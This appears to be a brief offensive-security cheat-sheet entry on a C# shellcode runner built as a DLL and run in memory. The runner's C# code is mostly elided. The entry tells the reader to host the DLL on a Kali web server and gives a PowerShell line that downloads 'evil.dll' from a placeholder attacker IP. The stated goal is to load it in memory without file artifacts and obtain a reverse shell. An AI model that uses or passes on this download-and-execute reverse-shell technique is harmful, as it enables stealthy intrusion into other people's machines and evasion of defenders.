## Shellcode Runner in .dll form and runs in Memory

Compile the below and host on your kali apache server.
...
namespace ClassLibrary1
{
    public class Class1
    {
        //Import the big three Win32APIs
...
Then in a 64bit powershell session, run the following code to fetch the .dll above and execute fully in memory without leaving any file artifacts and gain a rev shell

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<evil ip>/evil.dll')
